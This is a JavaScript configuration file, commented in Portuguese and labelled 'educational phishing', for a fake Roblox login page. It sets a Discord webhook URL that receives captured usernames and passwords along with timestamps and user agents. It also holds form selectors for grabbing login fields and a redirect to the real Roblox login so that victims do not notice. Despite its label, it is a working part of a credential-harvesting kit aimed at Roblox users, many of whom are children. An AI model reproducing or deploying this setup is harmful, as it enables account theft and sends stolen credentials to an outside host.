// Configurações do Phishing Educativo
const CONFIG = {
    // 🔗 WEBHOOK - Substitua pela sua URL
    webhookUrl: 'https://discord.com/api/webhooks/1401006483638059169/b1LcJW3NKHML1NGg3Ry_EMujqVsUvAyZ_vOtf--Fw1FwtuTn5Dk7GNm5nVkRBYvtDuB3',
    
    // 🔄 REDIRECIONAMENTO - Para onde enviar após captura
    redirectUrl: 'https://www.roblox.com/login',
    
    // 📝 MENSAGEM - Formato da mensagem enviada
    messageFormat: {
        title: '🔐 **Dados Capturados - Roblox Login**',
        fields: [
            '👤 **Usuário:** {username}',
            '🔑 **Senha:** {password}',
            '⏰ **Data/Hora:** {timestamp}',
            '🌐 **URL:** {url}',
            '📱 **User Agent:** {userAgent}'
        ]
    },
    
    // ⏱️ DELAY - Tempo para aguardar o React carregar (ms)
    reactLoadDelay: 2000,
    
    // 🎯 SELETORES - Campos do formulário
    selectors: {
        username: 'input[type="text"], input[type="email"], input[name="username"], input[name="email"]',
        password: 'input[type="password"], input[name="password"]',
        submit: 'button[type="submit"], input[type="submit"], .btn-primary, .login-button',
        form: 'form'
    },
    
    // 🎨 PERSONALIZAÇÃO
    branding: {
        siteName: 'Roblox',
        logo: 'https://cdn.roblox.com/v2/assets/images/logo.png'
    }
};

// Exportar configuração
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CONFIG;
} 